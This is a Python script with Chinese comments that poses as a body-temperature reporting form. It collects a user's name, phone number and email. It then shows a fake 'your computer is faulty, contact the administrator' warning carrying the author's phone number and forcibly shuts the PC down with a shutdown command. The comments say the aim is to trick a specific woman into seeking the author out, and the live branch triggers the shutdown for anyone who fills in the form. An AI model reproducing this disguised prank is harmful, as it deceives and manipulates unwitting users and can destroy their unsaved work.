import easygui as g  # 安装easygui库
import time  # 导入time库
import os  # 导入os库


# 先设置一个基本的窗口，告诉她要填报一个信息，就以体温填报为例吧
msg = g.msgbox(msg="为确保工作室能够安全，请您认真填报体温",
               title="体温填报系统", ok_button="ok")
# 当然你也可以指定信息参数和标题参数
# 出来一个填报窗口
msg = "请填写以下信息(其中带*号的项为必填项)"  # 填报提示信息
title = "体温填报系统"  # 标题
fieldNames = ["*姓名", "*手机号码", "*日期(格式：20200229)", "*体温", "Email"]  # 内容和格式
fieldValues = []  # 拿个空列表装信息
fieldValues = g.multenterbox(msg, title, fieldNames)  # 把信息装进去
while True:
    if fieldValues == None:
        break
    errmsg = ""
    for i in range(len(fieldNames)):
        option = fieldNames[i].strip()
        if fieldValues[i].strip() == "" and option[0] == "*":
            errmsg += ("【%s】为必填项   " % fieldNames[i])
    if errmsg == "":
        break
    fieldValues = g.multenterbox(errmsg, title, fieldNames, fieldValues)
print(fieldValues)
"""划重点：这里是关键！用日期作为控制点比较好！直接上来就不能用的话，肯定说是你这个系统有问题！心里骂你搞得什么破系统！"""
"""要让她能正常用上一两天，到时候系统不能用了，就该考虑是自己电脑的问题了！就该找你修电脑了！"""
# if fieldValues[0] == "小红":  # 要专门针对她来设计出错，否则别人都该说是你搞的破系统了
#     if fieldValues[2] == "2020":  # 设置系统出问题的时间，最好设置为发给她的两天后
#         msg = g.msgbox(msg="您的电脑存在故障请重试，无法填报请联系管理员：15219740694",
#                        title="警告！", ok_button="ok")  # 告诉他要联系你解决
#         time.sleep(5)  # 留5秒钟让她记下来
#         # os.system('shutdown -s -f -t 5')  # 5秒后自动关机！
#     # 内心：我电脑怎么回事啊？怎么自动关机了？我得杀个毒了！
#     # 内心：算了，还是直接找管理员吧！趁这个机会看看他啥样！
if fieldValues[0] != "":  # 要专门针对她来设计出错，否则别人都该说是你搞的破系统了
    if fieldValues[2] != "":  # 设置系统出问题的时间，最好设置为发给她的两天后
        msg = g.msgbox(msg="您的电脑存在故障请重试，无法填报请联系管理员：15219740694",
                       title="警告！", ok_button="ok")  # 告诉他要联系你解决
        time.sleep(5)  # 留5秒钟让她记下来
        os.system('shutdown -s -f -t 5')  # 5秒后自动关机！
    # 内心：我电脑怎么回事啊？怎么自动关机了？我得杀个毒了！
    # 内心：算了，还是直接找管理员吧！趁这个机会看看他啥样！
else:
    msg = g.msgbox(msg="感谢您的填写，祝您生活愉快", title="体温填报系统",
                   ok_button="ok")  # 正常状态运行